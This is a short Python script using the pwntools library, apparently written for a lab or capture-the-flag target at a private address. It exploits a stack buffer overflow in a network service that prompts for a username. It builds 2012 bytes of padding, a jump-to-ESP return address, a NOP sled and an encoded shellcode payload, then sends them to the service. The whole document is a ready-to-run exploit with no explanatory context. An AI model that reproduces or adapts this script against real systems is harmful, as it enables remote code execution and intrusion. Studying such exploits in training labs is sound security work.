#!/usr/bin/env python3.11

from pwn import *

ip = "10.10.38.59"
port = 9999
username = b"Doreng"
offset=2012
padding = b"A" * offset
esp_jump = b"\xdf\x14\x50\x62"
nops = b"\x90" * 16
payload=(
    b"\xba\x09\xee\x32\xf1\xda\xc5\xd9\x74\x24\xf4\x58\x29\xc9"
    b"\xb1\x52\x31\x50\x12\x03\x50\x12\x83\xe1\x12\xd0\x04\x0d"
    b"\x02\x97\xe7\xed\xd3\xf8\x6e\x08\xe2\x38\x14\x59\x55\x89"
    b"\x5e\x0f\x5a\x62\x32\xbb\xe9\x06\x9b\xcc\x5a\xac\xfd\xe3"
    b"\x5b\x9d\x3e\x62\xd8\xdc\x12\x44\xe1\x2e\x67\x85\x26\x52"
    b"\x8a\xd7\xff\x18\x39\xc7\x74\x54\x82\x6c\xc6\x78\x82\x91"
    b"\x9f\x7b\xa3\x04\xab\x25\x63\xa7\x78\x5e\x2a\xbf\x9d\x5b"
    b"\xe4\x34\x55\x17\xf7\x9c\xa7\xd8\x54\xe1\x07\x2b\xa4\x26"
    b"\xaf\xd4\xd3\x5e\xd3\x69\xe4\xa5\xa9\xb5\x61\x3d\x09\x3d"
    b"\xd1\x99\xab\x92\x84\x6a\xa7\x5f\xc2\x34\xa4\x5e\x07\x4f"
    b"\xd0\xeb\xa6\x9f\x50\xaf\x8c\x3b\x38\x6b\xac\x1a\xe4\xda"
    b"\xd1\x7c\x47\x82\x77\xf7\x6a\xd7\x05\x5a\xe3\x14\x24\x64"
    b"\xf3\x32\x3f\x17\xc1\x9d\xeb\xbf\x69\x55\x32\x38\x8d\x4c"
    b"\x82\xd6\x70\x6f\xf3\xff\xb6\x3b\xa3\x97\x1f\x44\x28\x67"
    b"\x9f\x91\xff\x37\x0f\x4a\x40\xe7\xef\x3a\x28\xed\xff\x65"
    b"\x48\x0e\x2a\x0e\xe3\xf5\xbd\x3b\xf0\xd0\x9d\x54\xfa\x1a"
    b"\xdb\x9d\x73\xfc\x89\xcd\xd5\x57\x26\x77\x7c\x23\xd7\x78"
    b"\xaa\x4e\xd7\xf3\x59\xaf\x96\xf3\x14\xa3\x4f\xf4\x62\x99"
    b"\xc6\x0b\x59\xb5\x85\x9e\x06\x45\xc3\x82\x90\x12\x84\x75"
    b"\xe9\xf6\x38\x2f\x43\xe4\xc0\xa9\xac\xac\x1e\x0a\x32\x2d"
    b"\xd2\x36\x10\x3d\x2a\xb6\x1c\x69\xe2\xe1\xca\xc7\x44\x58"
    b"\xbd\xb1\x1e\x37\x17\x55\xe6\x7b\xa8\x23\xe7\x51\x5e\xcb"
    b"\x56\x0c\x27\xf4\x57\xd8\xaf\x8d\x85\x78\x4f\x44\x0e\x98"
    b"\xb2\x4c\x7b\x31\x6b\x05\xc6\x5c\x8c\xf0\x05\x59\x0f\xf0"
    b"\xf5\x9e\x0f\x71\xf3\xdb\x97\x6a\x89\x74\x72\x8c\x3e\x74"
    b"\x57")
message = padding + esp_jump + nops + payload

r = remote(ip, port)
r.recvuntil(b": ")
r.sendline(username)
r.recvuntil(b": ")
r.sendline(message)
r.close()